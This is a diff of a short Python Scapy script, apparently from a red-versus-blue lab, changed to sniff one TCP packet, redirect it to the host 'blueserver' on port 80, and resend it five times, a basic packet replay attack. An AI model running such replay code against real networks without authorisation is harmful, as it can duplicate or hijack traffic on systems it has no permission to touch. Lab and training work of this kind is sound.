@@ -1,26 +1,29 @@
 from scapy.all import *
 
-target_ip = "blueserver"  
+target_ip = "blueserver"
 target_port = 80
+intercepted_packet = None
 
-packet_data = "This is the packet data we intercepted and are re-sending."
+def packet_callback(packet):
+    global intercepted_packet
+    intercepted_packet = packet
 
-def send_packet(packet_content):
-    packet = IP(dst=target_ip)/TCP(dport=target_port, flags='S')/Raw(load=packet_content)
-    
-    response = sr1(packet, timeout=2)
-    if response:
-        print("Received response from target.")
+def send_intercepted_packet(target_ip, target_port, times=1):
+    if intercepted_packet:
+        intercepted_packet[IP].dst = target_ip
+        intercepted_packet[TCP].dport = target_port
+        for _ in range(times):
+            send(intercepted_packet)
+            print(f"Sent packet {(_ + 1)} to {target_ip}:{target_port}")
     else:
-        print("No response from target.")
+        print("No intercepted packet available to send.")
 
 def main():
-    print(f"Sending intercepted packet data to {target_ip}:{target_port}")
     try:
-        send_packet(packet_data)
-        print("Packet sent.")
-    except Exception as e:
-        print(f"Error sending packet: {e}")
+        sniff(filter="tcp", prn=packet_callback, count=1)
+        send_intercepted_packet(target_ip, target_port, times=5) 
+    except KeyboardInterrupt:
+        print("\nProcess stopped.")
 
 if __name__ == "__main__":
     main()
